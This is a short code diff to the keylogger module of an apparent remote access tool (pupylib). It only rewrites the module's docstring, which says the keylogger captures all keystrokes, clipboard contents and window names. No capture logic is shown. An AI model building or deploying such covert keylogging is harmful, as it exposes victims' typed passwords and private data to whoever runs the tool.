@@ -13,7 +13,10 @@ from pupylib.utils.rpyc_utils import redirected_stdio
 __class_name__="KeyloggerModule"
 
 class KeyloggerModule(PupyModule):
-	""" a simple keylogger :-) """
+	""" 
+		A keylogger to monitor all keyboards interaction including the clipboard :-)
+		The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
+	"""
 	#max_clients=1
 	daemon=True
 	unique_instance=True
